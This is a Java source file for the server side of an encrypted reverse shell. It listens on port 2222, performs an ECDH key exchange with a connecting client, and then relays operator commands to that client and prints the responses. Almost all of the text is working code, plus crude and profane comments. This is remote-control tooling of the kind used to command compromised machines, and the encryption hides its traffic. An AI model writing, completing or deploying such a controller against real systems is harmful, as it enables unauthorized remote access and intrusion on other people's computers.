package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;
import java.net.*;
import java.util.logging.*;
import obs1d1anc1ph3r.reverseshell.server.encryption.ECDHKeyExchange;

public class ReverseShellServer {

	private static final int SERVER_PORT = 2222;
	private static final Logger logger = Logger.getLogger(ReverseShellServer.class.getName());
	private ServerSocket serverSocket;
	private Socket clientSocket;
	private DataInputStream dataIn;
	private DataOutputStream dataOut;
	private BufferedReader userInput;
	private Thread outputReceiver;
	private Thread inputHandler;
	private byte[] encryptionKey;
	private byte[] nonce;

	public static void main(String[] args) {
		ReverseShellServer server = new ReverseShellServer();
		server.start();
	}

	public void start() {
		try {
			setupServer(); //Server port and stuff
			waitForConnection(); //Wait for client
			setupStreams(); //In and out streams
			setupSecureConnection(); //Do the cool handshake so you know they're a homie

			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey, nonce)); //Handle those responses
			outputReceiver.start();

			inputHandler = new Thread(new CommandSender(dataOut, userInput, this, encryptionKey, nonce)); //Send those commands like a dom
			inputHandler.start();

		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Server error: " + e.getMessage(), e);
		}
	}

	private void setupServer() throws IOException {
		serverSocket = new ServerSocket(SERVER_PORT);
		logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT); //Port stuff, fuck yeah
	}

	private void waitForConnection() throws IOException {
		logger.info("[-] Waiting for incoming connection..."); //I'm waiting
		clientSocket = serverSocket.accept();
		logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress()); //Gimme that ip
	}

	private void setupStreams() throws IOException {
		dataIn = new DataInputStream(clientSocket.getInputStream());
		dataOut = new DataOutputStream(clientSocket.getOutputStream());
		userInput = new BufferedReader(new InputStreamReader(System.in));
	}

	private void setupSecureConnection() throws IOException {
		try {
			byte[] serverPrivateKey = ECDHKeyExchange.generatePrivateKey(); //Key stuff
			byte[] serverPublicKey = ECDHKeyExchange.generatePublicKey(serverPrivateKey); //More key stuff

			dataOut.writeInt(serverPublicKey.length); //Give the client some of the key stuff
			dataOut.write(serverPublicKey); //More giving the client key stuff
			dataOut.flush(); //More flushing

			int clientKeyLength = dataIn.readInt(); //Get the client's key stuff
			byte[] clientPublicKey = new byte[clientKeyLength]; //More getting the client's key stuff
			dataIn.readFully(clientPublicKey); //Maybe this is why I'm a virgin?

			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(serverPrivateKey, clientPublicKey); //Do the handshake like a fucking boss

			logger.info("[-] Secure connection established using ECDH and ChaCha20 encryption."); //Yeah, this is why I'm a virgin
		} catch (IOException e) {
			throw new IOException("Secure key exchange failed: " + e.getMessage(), e);
		}
	}

	public Socket getClientSocket() { //clientussy
		return clientSocket;
	}

	public void cleanup() { //Hell yeah
		try {
			if (outputReceiver != null && outputReceiver.isAlive()) {
				outputReceiver.interrupt();
			}
			if (inputHandler != null && inputHandler.isAlive()) {
				inputHandler.interrupt();
			}
			closeResources();
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
		}
	}

	private void closeResources() throws IOException { //Wooooooo, I'm almost done writing comments
		try {
			if (userInput != null) {
				userInput.close();
			}
			if (dataIn != null) {
				dataIn.close();
			}
			if (dataOut != null) {
				dataOut.close();
			}
			if (clientSocket != null) {
				clientSocket.close();
			}
			if (serverSocket != null) {
				serverSocket.close();
			}
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error closing resources: " + e.getMessage(), e);
			throw e;
		}
	}
}
